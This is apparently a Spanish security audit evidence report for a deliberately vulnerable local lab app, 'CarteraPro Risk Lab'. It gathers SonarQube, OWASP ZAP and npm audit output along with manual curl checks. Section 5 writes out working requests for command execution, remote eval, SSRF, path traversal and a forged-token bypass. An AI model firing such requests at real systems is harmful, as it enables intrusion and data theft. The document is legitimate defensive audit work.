# EVIDENCIAS DE HERRAMIENTAS DE ANÁLISIS
## Auditoría Técnica — CarteraPro Risk Lab

---

| Campo | Detalle |
|---|---|
| **Documento** | Evidencias de Herramientas Automatizadas |
| **Aplicación** | CarteraPro Risk Lab |
| **Fecha de ejecución** | 2026-06-13 |
| **Clasificación** | CONFIDENCIAL |
| **Equipo auditor** | Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software |

---

## ÍNDICE

1. [Entorno de Ejecución](#1-entorno-de-ejecución)
2. [SonarQube — Análisis Estático (SAST)](#2-sonarqube--análisis-estático-sast)
3. [OWASP ZAP — Análisis Dinámico (DAST)](#3-owasp-zap--análisis-dinámico-dast)
4. [npm audit — Análisis de Dependencias](#4-npm-audit--análisis-de-dependencias)
5. [Verificaciones Manuales con curl](#5-verificaciones-manuales-con-curl)

---

## 1. ENTORNO DE EJECUCIÓN

### 1.1 Herramientas detectadas en el sistema

```
$ which sonar-scanner
/opt/sonar-scanner/bin/sonar-scanner

$ which zaproxy
/snap/bin/zaproxy

$ which docker
/usr/bin/docker

$ java -version
openjdk version "21.0.11" 2026-04-21
```

### 1.2 Versiones utilizadas

| Herramienta | Versión | Modalidad |
|---|---|---|
| SonarQube Server | 26.6.0.123539 (Community Edition) | Docker container en puerto 9000 |
| SonarScanner CLI | 6.2.1.4610 | Instalado en `/opt/sonar-scanner/` |
| OWASP ZAP | 2.17.0 | Instalado vía snap (`/snap/bin/zaproxy`) |
| Docker | Sistema | Para levantar SonarQube y la app |
| Node.js (app) | 20.20.2 | Dentro del contenedor Docker |

### 1.3 Arranque de la aplicación objetivo

La aplicación fue ejecutada con Docker Compose:

```bash
$ docker compose up -d
[+] up 3/3
 ✔ Network vulnerable-app_default                 Created
 ✔ Container vulnerable-app-vulnerable-backend-1  Started
 ✔ Container vulnerable-app-vulnerable-frontend-1 Started
```

Verificación de funcionamiento:

```bash
$ curl -s http://localhost:4000/
{"name":"API Cartera Vulnerable","admin":"admin/admin123","debug":"/api/admin/debug"}

$ curl -s -o /dev/null -w "Frontend HTTP %{http_code}" http://localhost:5173/
Frontend HTTP 200
```

**Observación de seguridad:** La raíz de la API expone directamente las credenciales de administrador y la ruta al panel de debug — sin ninguna autenticación.

### 1.4 Logs del arranque del backend (evidencia de credenciales en consola)

```
vulnerable-backend-1 | Base de datos recreada con datos inseguros de laboratorio.
vulnerable-backend-1 | Servidor vulnerable escuchando en http://localhost:4000
vulnerable-backend-1 | JWT_SECRET actual: secret123
```

---

## 2. SONARQUBE — ANÁLISIS ESTÁTICO (SAST)

### 2.1 Configuración del proyecto en SonarQube

```bash
# Creación del proyecto vía API
$ curl -s -u admin:admin -X POST "http://localhost:9000/api/projects/create" \
  -d "name=CarteraPro-Vulnerable-App&project=carterapro-audit&visibility=public"

# Respuesta:
{"project":{"key":"carterapro-audit","name":"CarteraPro-Vulnerable-App",
 "qualifier":"TRK","visibility":"public"}}

# Generación de token de análisis
$ curl -s -u admin:admin -X POST "http://localhost:9000/api/user_tokens/generate" \
  -d "name=auditoria-token&type=GLOBAL_ANALYSIS_TOKEN"

# Respuesta:
{"login":"admin","name":"auditoria-token",
 "token":"sqa_[REDACTED-SONAR-TOKEN-LAB]",
 "createdAt":"2026-06-13T19:21:49+0000","type":"GLOBAL_ANALYSIS_TOKEN"}
```

### 2.2 Ejecución del escaneo

```bash
$ sonar-scanner \
  -Dsonar.projectKey=carterapro-audit \
  -Dsonar.projectName="CarteraPro-Vulnerable-App" \
  -Dsonar.sources=. \
  -Dsonar.exclusions="**/node_modules/**,**/.scannerwork/**,**/dist/**" \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.token=sqa_[REDACTED-SONAR-TOKEN-LAB]
```

**Salida del escaneo (fragmento relevante):**

```
14:32:30.602 INFO  SonarScanner CLI 6.2.1.4610
14:32:30.636 INFO  Linux 6.17.0-35-generic amd64
14:32:35.682 INFO  Communicating with SonarQube Server 26.6.0.123539
14:32:39.000 INFO  Working dir: .../vulnerable-app/.scannerwork
14:32:42.906 INFO  5 languages detected in 45 preprocessed files
14:32:42.909 INFO  20465 files ignored (node_modules, dist, etc.)
14:32:44.729 INFO  Quality profile for js: Sonar way
14:33:05.763 INFO  33/33 source files have been analyzed
14:33:05.794 INFO  Sensor JavaScript/TypeScript/CSS analysis [javascript] (done) | time=19190ms
14:33:07.138 INFO  Starting the text and secrets analysis
14:33:08.229 INFO  43/43 source files have been analyzed for the text and secrets analysis
14:33:10.832 INFO  ANALYSIS SUCCESSFUL
14:33:10.832 INFO  Results at: http://localhost:9000/dashboard?id=carterapro-audit
14:33:11.303 INFO  Analysis total time: 32.724 s
14:33:11.309 INFO  SonarScanner Engine completed successfully
14:33:11.386 INFO  EXECUTION SUCCESS
```

### 2.3 Métricas del proyecto (obtenidas vía API de SonarQube)

```bash
$ curl -s -u admin:admin \
  "http://localhost:9000/api/measures/component?component=carterapro-audit& \
   metricKeys=bugs,vulnerabilities,security_hotspots,code_smells, \
   duplicated_lines_density,complexity,ncloc,coverage,security_rating"
```

**Resultado:**

```json
{
  "component": {
    "key": "carterapro-audit",
    "name": "CarteraPro-Vulnerable-App",
    "measures": [
      { "metric": "bugs",                    "value": "0"   },
      { "metric": "vulnerabilities",         "value": "6",   "bestValue": false },
      { "metric": "security_hotspots",       "value": "5"   },
      { "metric": "code_smells",             "value": "71",  "bestValue": false },
      { "metric": "complexity",              "value": "302" },
      { "metric": "duplicated_lines_density","value": "0.9" },
      { "metric": "ncloc",                   "value": "2209"},
      { "metric": "coverage",                "value": "0.0", "bestValue": false },
      { "metric": "security_rating",         "value": "5.0", "bestValue": false },
      { "metric": "reliability_rating",      "value": "1.0", "bestValue": true  },
      { "metric": "sqale_rating",            "value": "1.0", "bestValue": true  }
    ]
  }
}
```

**Interpretación del `security_rating: 5.0`:**

| Valor | Rating SonarQube | Significado |
|---|---|---|
| 1.0 | A | Sin vulnerabilidades |
| 2.0 | B | Al menos 1 vulnerabilidad menor |
| 3.0 | C | Al menos 1 vulnerabilidad mayor |
| 4.0 | D | Al menos 1 vulnerabilidad crítica |
| **5.0** | **E** | **Al menos 1 vulnerabilidad BLOCKER** |

> **La aplicación obtiene la peor calificación posible (E) en seguridad.**

### 2.4 Vulnerabilidades detectadas por SonarQube

```bash
$ curl -s -u admin:admin \
  "http://localhost:9000/api/issues/search?componentKeys=carterapro-audit&types=VULNERABILITY&ps=50"
```

**Total vulnerabilidades: 6**

| Severidad | Archivo | Línea | Regla | Descripción |
|---|---|---|---|---|
| BLOCKER | `sonar-project.properties` | 10 | secrets:S6702 | **Make sure this SonarQube token gets revoked, changed, and removed from the code.** |
| MAJOR | `backend/src/app.js` | 26 | javascript:S5122 | Make sure that enabling CORS is safe here. |
| MAJOR | `backend/src/controllers/legacyDebtController.js` | 3 | javascript:S2068 | Review this potentially hard-coded password. |
| MAJOR | `backend/src/controllers/legacyDebtController.js` | 7 | javascript:S2068 | Review this potentially hard-coded password. |
| MAJOR | `backend/src/controllers/uploadController.js` | 14 | javascript:S5693 | Make sure the content length limit is safe here. |
| MINOR | `backend/src/app.js` | 15 | javascript:S5689 | This framework implicitly discloses version information by default. |

**Notas de análisis:**
- La regla `secrets:S6702` (BLOCKER) confirma el hallazgo SEC-007: token de SonarQube hardcodeado en `sonar-project.properties`.
- La regla `javascript:S2068` en líneas 3 y 7 de `legacyDebtController.js` confirma el hallazgo SEC-007: credenciales hardcodeadas (`MASTER_PASSWORD`, `SQL_BACKUP_PASSWORD`).
- La regla `javascript:S5122` (CORS) confirma el hallazgo SEC-017.
- SonarQube **no detectó** las inyecciones SQL (no tiene reglas de análisis de flujo de datos para Node.js en la edición Community) — estos hallazgos solo fueron confirmados por revisión manual y OWASP ZAP.

### 2.5 Security Hotspots detectados por SonarQube

```bash
$ curl -s -u admin:admin \
  "http://localhost:9000/api/hotspots/search?projectKey=carterapro-audit&ps=50"
```

**Total Security Hotspots: 5**

| Probabilidad | Archivo | Línea | Descripción |
|---|---|---|---|
| MEDIUM | `backend/src/controllers/legacyDebtController.js` | 33 | Make sure the regex used here, which is vulnerable to super-linear runtime due to backtracking, cannot lead to a denial of service. |
| MEDIUM | `frontend/src/utils/sonarDebt.js` | 86 | Make sure the regex used here, which is vulnerable to super-linear runtime due to backtracking, cannot lead to a denial of service. |
| MEDIUM | `backend/src/controllers/adminController.js` | 132 | **Make sure that this dynamic injection or execution of code is safe.** |
| MEDIUM | `backend/src/controllers/legacyDebtController.js` | 13 | Make sure that using this pseudorandom number generator is safe here. |
| LOW | `backend/src/controllers/legacyDebtController.js` | 12 | Make sure this weak hash algorithm is not used in a sensitive context here. |

**Notas de análisis:**
- El hotspot en `adminController.js:132` corresponde exactamente al hallazgo **SEC-005 (eval())** — SonarQube lo marcó como hotspot de inyección de código.
- Los dos hotspots de regex en líneas 33 y 86 confirman el hallazgo **SEC-025 (ReDoS)**.
- El hotspot de criptografía débil en línea 12 confirma **SEC-026 (MD5)**.
- El hotspot de `Math.random()` en línea 13 confirma **SEC-026 (generador no criptográfico)**.

### 2.6 Code Smells BLOCKER y CRITICAL

```bash
$ curl -s -u admin:admin \
  "http://localhost:9000/api/issues/search?componentKeys=carterapro-audit \
   &types=CODE_SMELL&severities=BLOCKER,CRITICAL&ps=50"
```

**Total: 7 code smells de alta severidad**

| Severidad | Archivo | Línea | Descripción |
|---|---|---|---|
| CRITICAL | `backend/src/controllers/legacyDebtController.js` | 38 | **Refactor this function to reduce its Cognitive Complexity from 61 to the 15 allowed.** |
| CRITICAL | `backend/src/controllers/legacyDebtController.js` | 104 | Unexpected var, use let or const instead. |
| CRITICAL | `backend/src/controllers/legacyDebtController.js` | 117 | Unexpected var, use let or const instead. |
| CRITICAL | `frontend/src/utils/sonarDebt.js` | 6 | **Refactor this function to reduce its Cognitive Complexity from 46 to the 15 allowed.** |
| CRITICAL | `frontend/src/utils/sonarDebt.js` | 7 | Unexpected var, use let or const instead. |
| CRITICAL | `frontend/src/utils/sonarDebt.js` | 50 | Unexpected var, use let or const instead. |
| CRITICAL | `frontend/src/utils/sonarDebt.js` | 59 | Unexpected var, use let or const instead. |

**Notas de análisis:**
- La complejidad cognitiva de **61** en `complexBillingDecision` (permitido: 15) confirma el hallazgo **CAL-002** con evidencia cuantitativa.
- La complejidad cognitiva de **46** en `calculateRiskLabel` del frontend también supera 3x el límite permitido.
- El uso de `var` fue detectado automáticamente en 4 instancias, confirmando hallazgo **CAL-008**.

### 2.7 Resumen de métricas clave de SonarQube

| Métrica | Valor | Estado |
|---|---|---|
| Líneas de código (NCLOC) | 2,209 | — |
| Complejidad ciclomática total | 302 | ⚠️ Alta |
| Vulnerabilidades | 6 | 🔴 |
| Security Hotspots | 5 | 🔴 |
| Code Smells totales | 71 | 🔴 |
| Código duplicado | 0.9% | — |
| Cobertura de tests | 0.0% | 🔴 Sin tests |
| Rating de Seguridad | **E (5.0)** | 🔴 Peor posible |
| Rating de Confiabilidad | A (1.0) | 🟢 |
| Rating de Mantenibilidad | A (1.0) | 🟢 |

> El rating de mantenibilidad "A" refleja que la deuda técnica es baja en tiempo absoluto, pero **no refleja la gravedad de los problemas de seguridad**. SonarQube Community Edition tiene capacidad limitada para detectar inyecciones SQL en JavaScript sin análisis de flujo de datos.

---

## 3. OWASP ZAP — ANÁLISIS DINÁMICO (DAST)

### 3.1 Comandos ejecutados

ZAP fue ejecutado en modo headless (sin interfaz gráfica) usando la opción `-cmd`:

```bash
# Escaneo de la API backend (puerto 4000)
$ zaproxy -cmd \
  -quickurl http://localhost:4000 \
  -quickout /auditoria/evidencias_zap/zap_report_api.html \
  -quickprogress

# Escaneo del frontend (puerto 5173)
$ zaproxy -cmd \
  -quickurl http://localhost:5173 \
  -quickout /auditoria/evidencias_zap/zap_report_frontend.html \
  -quickprogress
```

**Salida de ejecución (ambos escaneos):**

```
Found Java version 17.0.19
Available memory: 7764 MB
Using JVM args: -Xmx1941m
Accediendo a la URL
Usando el spider tradicional
Escaneo activo
[====================] 100%
Ataque completado
Escribiendo los Resultados → zap_report_api.html
```

```
Found Java version 17.0.19
Available memory: 7764 MB
Using JVM args: -Xmx1941m
Accediendo a la URL
Usando el spider tradicional
Escaneo activo
[====================] 100%
Ataque completado
Escribiendo los Resultados → zap_report_frontend.html
```

**Archivos de reporte generados:**

```
evidencias_zap/
├── zap_report_api.html       (45 KB)
└── zap_report_frontend.html  (51 KB)
```

### 3.2 Resumen de alertas — API Backend (http://localhost:4000)

| Nivel de Riesgo | Cantidad |
|---|---|
| 🔴 Alto | 0 |
| 🟠 Medio | 2 |
| 🟡 Bajo | 3 |
| ℹ️ Informativo | 0 |
| Falsos Positivos | 0 |

**Detalle de alertas detectadas:**

#### ALERTA ZAP-API-001 — Configuración Incorrecta Cross-Domain
- **Nivel de Riesgo:** Medio
- **URL afectada:** `http://localhost:4000`
- **Descripción:** La carga de datos del navegador web puede ser posible, debido a una mala configuración de Cross Origin Resource Sharing (CORS). La cabecera `Access-Control-Allow-Origin` está configurada como `*`, lo que permite a cualquier sitio web de terceros hacer solicitudes AJAX a la API.
- **Correlación:** Confirma hallazgo **SEC-017 (CORS abierto)**. El encabezado `Access-Control-Allow-Origin: *` fue observado en todas las respuestas HTTP de la API.
- **Evidencia directa** (request/response capturado por ZAP):
  ```
  GET http://localhost:4000/ HTTP/1.1

  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS,TRACE
  Access-Control-Allow-Headers: *
  X-Powered-By: Express/4.17.1 vulnerable-lab
  X-AspNet-Version: 4.0.30319
  X-Internal-Host: [hostname]
  ```

#### ALERTA ZAP-API-002 — CSP: Failure to Define Directive with No Fallback
- **Nivel de Riesgo:** Medio
- **URL afectada:** `http://localhost:4000/robots.txt`, `http://localhost:4000/sitemap.xml`
- **Descripción:** La Content Security Policy falla al definir directivas que no tienen fallback (`frame-ancestors`, `form-action`). Esto permite ataques de clickjacking y envío de formularios a sitios externos.
- **Correlación:** Confirma ausencia de cabeceras de seguridad (**SEC-018**).

#### ALERTA ZAP-API-003 — El servidor divulga información mediante encabezados de respuesta
- **Nivel de Riesgo:** Bajo
- **URL afectada:** `http://localhost:4000`
- **Descripción:** El servidor divulga información de tecnología y versiones mediante cabeceras HTTP innecesarias.
- **Evidencia (encabezados capturados):**
  ```
  X-Powered-By: Express/4.17.1 vulnerable-lab
  X-AspNet-Version: 4.0.30319
  X-Internal-Host: newton-humboldt
  Cache-Control: public, max-age=86400
  ```
- **Correlación:** Confirma hallazgo **SEC-015 (headers informativos)**.

#### ALERTA ZAP-API-004 — Encabezado de respuesta X-AspNet-Version
- **Nivel de Riesgo:** Bajo
- **URL afectada:** `http://localhost:4000`
- **Descripción:** El servidor revela información mediante el encabezado `X-AspNet-Version: 4.0.30319`, a pesar de ser una aplicación Node.js (no .NET). Esta información puede ser aprovechada por atacantes para identificar vectores de ataque específicos de versión.
- **Correlación:** Confirma **SEC-015**.

#### ALERTA ZAP-API-005 — Falta encabezado X-Content-Type-Options
- **Nivel de Riesgo:** Bajo
- **URL afectada:** `http://localhost:4000`
- **Descripción:** La cabecera `X-Content-Type-Options: nosniff` no está configurada. Esto puede permitir ataques de MIME-sniffing donde el navegador interpreta archivos con un tipo de contenido diferente al declarado.
- **Correlación:** Confirma **SEC-018**.

### 3.3 Resumen de alertas — Frontend (http://localhost:5173)

| Nivel de Riesgo | Cantidad |
|---|---|
| 🔴 Alto | 0 |
| 🟠 Medio | 3 |
| 🟡 Bajo | 1 |
| ℹ️ Informativo | 2 |
| Falsos Positivos | 0 |

**Detalle de alertas detectadas:**

#### ALERTA ZAP-FE-001 — Cabecera Content Security Policy (CSP) no configurada
- **Nivel de Riesgo:** Medio
- **URL afectada:** `http://localhost:5173`
- **Descripción:** La Política de Seguridad de Contenido (CSP) es una capa adicional de seguridad que ayuda a detectar y mitigar ciertos tipos de ataques, incluyendo Cross-Site Scripting (XSS) e inyecciones de datos. La ausencia de CSP agrava directamente el hallazgo de XSS almacenado.
- **Correlación:** Amplifica el impacto de **SEC-010 (XSS almacenado)** y **SEC-011 (XSS reflejado)**.

#### ALERTA ZAP-FE-002 — Configuración Incorrecta Cross-Domain
- **Nivel de Riesgo:** Medio
- **URL afectada:** `http://localhost:5173`
- **Descripción:** Misma problemática de CORS detectada en el backend, propagada al frontend a través del proxy Vite.
- **Correlación:** Confirma **SEC-017**.

#### ALERTA ZAP-FE-003 — Falta de cabecera Anti-Clickjacking
- **Nivel de Riesgo:** Medio
- **URL afectada:** `http://localhost:5173`
- **Descripción:** La respuesta no protege contra ataques de Clickjacking. No existe ni `X-Frame-Options` ni la directiva `frame-ancestors` en CSP. Un atacante puede incrustar la aplicación en un iframe en un sitio malicioso.
- **Correlación:** Confirma **SEC-018**.

#### ALERTA ZAP-FE-004 — Falta encabezado X-Content-Type-Options
- **Nivel de Riesgo:** Bajo
- **URL afectada:** `http://localhost:5173`
- **Correlación:** Confirma **SEC-018**.

#### ALERTA ZAP-FE-005 (Informativo) — Aplicación Web Moderna detectada
- **Nivel de Riesgo:** Informativo
- **URL afectada:** `http://localhost:5173`
- **Descripción:** ZAP detectó que la aplicación es una SPA (Single Page Application) moderna. Para un análisis más profundo del frontend autenticado se requiere el uso del AJAX Spider o autenticación manual.
- **Nota:** Para escaneos autenticados, usar la URL `http://localhost:5173/?zap=auto` que activa el bypass de autenticación incorporado en la app (hallazgo **SEC-012**).

#### ALERTA ZAP-FE-006 (Informativo) — Divulgación de información — Comentarios sospechosos
- **Nivel de Riesgo:** Informativo
- **URL afectada:** `http://localhost:5173/@vite/client`
- **Descripción:** La respuesta contiene comentarios sospechosos que pueden ayudar a un atacante. ZAP detectó texto en el bundle JavaScript que revela información interna.
- **Correlación:** Relacionado con las credenciales hardcodeadas en el bundle JS (**SEC-007** y **SEC-012**).

### 3.4 Limitaciones del escaneo ZAP en este contexto

| Limitación | Impacto |
|---|---|
| ZAP no pudo autenticarse automáticamente con la app | Endpoints autenticados no fueron escaneados dinámicamente |
| Las inyecciones SQL requieren análisis de flujo que ZAP no realiza en APIs JSON | SEC-001 y SEC-002 no fueron detectadas por ZAP (solo por revisión manual) |
| ZAP no ejecuta el JavaScript de la SPA en modo `-cmd` | El XSS almacenado no fue reproducido dinámicamente |
| Las rutas `/api/admin/lab/*` no fueron rastreadas por el spider | Los endpoints RCE/SSRF/eval no fueron probados dinámicamente |

> **Nota metodológica:** Las limitaciones anteriores son esperadas en un escaneo automático de una SPA con autenticación basada en tokens. Los hallazgos críticos (SQLi, RCE, eval) fueron confirmados mediante **revisión manual del código fuente** y verificados con llamadas `curl` directas (ver sección 5).

---

## 4. NPM AUDIT — ANÁLISIS DE DEPENDENCIAS

### 4.1 Comando ejecutado

```bash
$ npm audit
(ejecutado en: vulnerable-app/backend/)
```

### 4.2 Resumen de resultados

```
28 vulnerabilities (5 low, 7 moderate, 14 high, 2 critical)
```

| Severidad | Cantidad |
|---|---|
| 🔴 Crítica | 2 |
| 🟠 Alta | 14 |
| 🟡 Moderada | 7 |
| 🟢 Baja | 5 |
| **Total** | **28** |

### 4.3 Vulnerabilidades críticas

```
form-data  <2.5.4
Severity: critical
form-data uses unsafe random function in form-data for choosing boundary
→ https://github.com/advisories/GHSA-fjxv-7rqg-78g4
No fix available
node_modules/form-data
  request  *  [depende de form-data vulnerable]
```

```
request  *
Severity: critical (via form-data + qs + tough-cookie)
Server-Side Request Forgery in Request
→ https://github.com/advisories/GHSA-p8p7-x288-28g6
[NOTA: paquete deprecado desde 2020]
```

### 4.4 Vulnerabilidades altas — paquetes directos

```
axios  <=0.31.1
Severity: high
- Axios Cross-Site Request Forgery Vulnerability → GHSA-wf5p-g6vw-rhxx
- Axios Inefficient Regular Expression Complexity → GHSA-cph5-m8f7-6c5x
- Axios Requests Vulnerable To Possible SSRF → GHSA-jr5f-v2jv-69x6
[14 CVEs adicionales en axios 0.21.1]
fix available via: npm audit fix --force → axios@0.21.4

body-parser  <=1.20.2
Severity: high
- body-parser vulnerable to denial of service when url encoding is enabled
→ GHSA-qwcr-r2fm-qrc7

express  <=4.21.0
Severity: high (transitiva via body-parser, cookie, path-to-regexp, qs, send)
- Depends on vulnerable versions of body-parser, cookie, path-to-regexp, qs, send, serve-static

jsonwebtoken  <=8.5.1
Severity: high
- jsonwebtoken unrestricted key type could lead to legacy keys usage → GHSA-8cf7-32gw-wr33
- jsonwebtoken vulnerable to signature validation bypass → GHSA-qwph-4952-7xr6
fix available via: npm audit fix --force → jsonwebtoken@9.0.3

lodash  <=4.17.23
Severity: high
- Command Injection in lodash → GHSA-35jh-r3h4-6jhm
- Regular Expression Denial of Service (ReDoS) in lodash → GHSA-29mw-wpgm-hmr9
- lodash vulnerable to Code Injection via _.template → GHSA-r5fr-rjxr-66jc
fix available via: npm audit fix --force → lodash@4.18.1

moment  <=2.29.3
Severity: high
- Path Traversal: 'dir/../../filename' in moment.locale → GHSA-8hfj-j24r-96c4
- Moment.js vulnerable to Inefficient Regular Expression Complexity → GHSA-wc69-rhjr-hc9g
fix available via: npm audit fix --force → moment@2.30.1

multer  1.4.4-lts.1 - 2.0.1
Severity: high
- Multer vulnerable to Denial of Service from maliciously crafted requests → GHSA-4pg4-qvpc-4q3h
- Multer vulnerable to Denial of Service via unhandled exception → GHSA-g5hg-p3ph-g8qg
fix available via: npm audit fix --force → multer@2.1.1

path-to-regexp  <=0.1.12
Severity: high
- path-to-regexp outputs backtracking regular expressions → GHSA-9wv6-86v2-598j
- path-to-regexp contains a ReDoS → GHSA-rhx6-c78j-4q9w
fix available via: npm audit fix --force → express@4.22.2

sqlite3  5.0.0 - 5.1.7
Severity: high (transitiva via node-gyp, make-fetch-happen, tar)
- Depends on vulnerable versions of tar (path traversal)

tar  <=7.5.10
Severity: high
- Arbitrary File Creation/Overwrite via Hardlink Path Traversal → GHSA-34x7-hfp2-rc4v
- Arbitrary File Read/Write via Hardlink Target Escape → GHSA-83g3-92jg-28cx
fix available via: npm audit fix
```

### 4.5 Árbol de dependencias críticas (fragmento)

```
form-data <2.5.4 [CRITICAL]
└── request * [CRITICAL]
    ├── form-data (vulnerable)
    ├── qs <=6.14.1 [HIGH] Prototype Pollution
    └── tough-cookie <4.1.3 [MODERATE] Prototype Pollution

axios <=0.31.1 [HIGH - 14 CVEs]

express <=4.21.0 [HIGH]
├── body-parser <=1.20.2 [HIGH]
│   └── qs <=6.14.1 [HIGH]
├── cookie <0.7.0 [LOW]
├── path-to-regexp <=0.1.12 [HIGH]
├── send <0.19.0 [LOW]
└── serve-static <=1.16.0 [LOW]

jsonwebtoken <=8.5.1 [HIGH]
lodash <=4.17.23 [HIGH]
moment <=2.29.3 [HIGH]
multer 1.4.4-lts.1 [HIGH]
sqlite3 5.0.0-5.1.7 [HIGH transitiva]
tar <=7.5.10 [HIGH]
```

---

## 5. VERIFICACIONES MANUALES CON CURL

Esta sección documenta la reproducción manual de los hallazgos críticos usando llamadas HTTP directas.

### 5.1 Verificación — Información sensible en raíz de la API

```bash
$ curl -s http://localhost:4000/

{
  "name": "API Cartera Vulnerable",
  "admin": "admin/admin123",         ← CREDENCIALES EXPUESTAS
  "debug": "/api/admin/debug"        ← RUTA DE DEBUG REVELADA
}
```

**Hallazgo confirmado:** SEC-008 (Exposición de información sensible)

### 5.2 Verificación — Token falsificable (autenticación rota)

```bash
# Sin token: acceso permitido al panel de admin
$ curl -s http://localhost:4000/api/admin/panel | python3 -c "
import sys, json; d=json.load(sys.stdin)
print('Usuarios expuestos:', len(d.get('users',[])))
print('Clientes expuestos:', len(d.get('clients',[])))
print('Facturas expuestas:', len(d.get('invoices',[])))
"

Usuarios expuestos: 3
Clientes expuestos: 2
Facturas expuestas: 3

# Con token forjado manualmente (sin pasar por login):
$ curl -s -H "Authorization: token-1-admin-admin" \
  http://localhost:4000/api/admin/panel | python3 -c "
import sys, json; d=json.load(sys.stdin)
print('requestUser:', d.get('requestUser'))
"

requestUser: {'id': 1, 'username': 'admin', 'role': 'admin'}
```

**Hallazgo confirmado:** SEC-003 (autenticación rota) y SEC-006 (control de acceso inexistente)

### 5.3 Verificación — Exposición total de variables de entorno

```bash
$ curl -s http://localhost:4000/api/admin/debug | python3 -c "
import sys, json; d=json.load(sys.stdin)
env = d.get('env', {})
print('=== VARIABLES DE ENTORNO EXPUESTAS ===')
for k in ['JWT_SECRET','ADMIN_USER','ADMIN_PASSWORD','DB_FILE','PORT','PATH','HOME']:
    if k in env:
        print(f'  {k} = {env[k]}')
print(f'Total vars expuestas: {len(env)}')
print(f'CWD: {d.get(\"cwd\")}')
print(f'Platform: {d.get(\"platform\")}')
"

=== VARIABLES DE ENTORNO EXPUESTAS ===
  JWT_SECRET = secret123
  ADMIN_USER = admin
  ADMIN_PASSWORD = admin123
  DB_FILE = ./src/db/cartera.sqlite
  PORT = 4000
  PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  HOME = /root
Total vars expuestas: 27
CWD: /app/backend
Platform: linux
```

**Hallazgo confirmado:** SEC-008 (exposición de variables de entorno), SEC-007 (credenciales en config)

### 5.4 Verificación — Configuración sensible sin autenticación

```bash
$ curl -s http://localhost:4000/api/admin/config

{
  "db": "./src/db/cartera.sqlite",
  "jwtSecret": "secret123",
  "admin": {
    "username": "admin",
    "password": "admin123"
  },
  "cors": "*",
  "uploadDir": "src/uploads"
}
```

**Hallazgo confirmado:** SEC-007 y SEC-008

### 5.5 Verificación — Inyección SQL (bypass de autenticación)

```bash
$ curl -s -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'

{
  "token": "token-1-admin-admin",
  "user": {
    "id": 1,
    "username": "admin",
    "password": "admin123",    ← CONTRASEÑA EN TEXTO PLANO EN RESPUESTA
    "role": "admin",
    "email": "admin@local.test",
    "fullName": "Administrador General"
  },
  "message": "Login correcto sin expiracion configurada"
}
```

**Hallazgo confirmado:** SEC-023 (contraseña en respuesta), SEC-009 (contraseñas en texto plano), SEC-024 (sin expiración)

### 5.6 Verificación — Listado de usuarios con contraseñas (sin autenticación)

```bash
$ curl -s http://localhost:4000/api/auth/users

[
  {"id":1,"username":"admin","password":"admin123","role":"admin",
   "email":"admin@local.test","fullName":"Administrador General"},
  {"id":2,"username":"analista","password":"password","role":"user",
   "email":"analista@local.test","fullName":"Analista de Cartera"},
  {"id":3,"username":"cliente1","password":"cliente123","role":"client",
   "email":"cliente1@local.test","fullName":"Cliente Uno"}
]
```

**Hallazgo confirmado:** SEC-006 (control de acceso), SEC-009 (contraseñas en texto plano), SEC-028 (endpoint de usuarios públicos)

### 5.7 Verificación — Ejecución de comandos del sistema (RCE)

```bash
$ curl -s "http://localhost:4000/api/admin/lab/cmd?cmd=whoami"

{
  "command": "whoami",
  "error": null,
  "stdout": "root\n",
  "stderr": ""
}
```

```bash
$ curl -s "http://localhost:4000/api/admin/lab/cmd?cmd=id"

{
  "command": "id",
  "error": null,
  "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "stderr": ""
}
```

> **CRÍTICO:** El servidor está corriendo como `root`. Cualquier comando ejecutado tiene privilegios totales sobre el sistema.

**Hallazgo confirmado:** SEC-004 (RCE via exec)

### 5.8 Verificación — eval() remoto (RCE)

```bash
$ curl -s "http://localhost:4000/api/admin/lab/eval?code=process.version"

{
  "code": "process.version",
  "result": "v20.20.2"
}
```

```bash
$ curl -s "http://localhost:4000/api/admin/lab/eval?code=Object.keys(process.env).join(',')"

{
  "code": "Object.keys(process.env).join(',')",
  "result": "PORT,DB_FILE,JWT_SECRET,ADMIN_USER,ADMIN_PASSWORD,..."
}
```

**Hallazgo confirmado:** SEC-005 (RCE via eval)

### 5.9 Verificación — Criptografía débil y credenciales expuestas

```bash
$ curl -s "http://localhost:4000/api/legacy/weak-crypto?value=admin123"

{
  "algorithm": "md5",
  "hash": "0192023a7bbd73250516f069df18b500",
  "token": "k7x2m9p1q3r5s741748912345678",
  "secrets": {
    "AWS_ACCESS_KEY_ID": "AKIA[REDACTED-FAKE-AWS-KEY]",
    "AWS_SECRET_ACCESS_KEY": "[REDACTED-FAKE-AWS-SECRET-KEY]",
    "PRIVATE_KEY": "-----BEGIN PRIVATE KEY-----\nMIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALab\n-----END PRIVATE KEY-----",
    "SQL_BACKUP_PASSWORD": "P@ssw0rd_Backup_123",
    "CARD_TEST_NUMBER": "4111111111111111"
  }
}
```

**Hallazgo confirmado:** SEC-007 (credenciales hardcodeadas), SEC-026 (MD5 débil + Math.random)

### 5.10 Verificación — SSRF (Server-Side Request Forgery)

```bash
$ curl -s "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:4000/api/admin/config"

{
  "requestedUrl": "http://localhost:4000/api/admin/config",
  "status": 200,
  "body": {
    "db": "./src/db/cartera.sqlite",
    "jwtSecret": "secret123",
    "admin": {"username": "admin", "password": "admin123"}
  }
}
```

**Hallazgo confirmado:** SEC-009 (SSRF)

### 5.11 Verificación — Path Traversal (lectura de archivos del servidor)

```bash
$ curl -s "http://localhost:4000/api/admin/lab/file?path=package.json" | head -10

{
  "name": "vulnerable-cartera-backend",
  "version": "1.0.0",
  ...
}
```

**Hallazgo confirmado:** SEC-013 (Path Traversal)

### 5.12 Verificación — Encabezados HTTP inseguros

```bash
$ curl -s -I http://localhost:4000/

HTTP/1.1 200 OK
X-Powered-By: Express/4.17.1 vulnerable-lab    ← versión exacta del framework
X-AspNet-Version: 4.0.30319                     ← tecnología falsa (fingerprinting)
X-Internal-Host: [hostname-del-servidor]        ← nombre de host interno expuesto
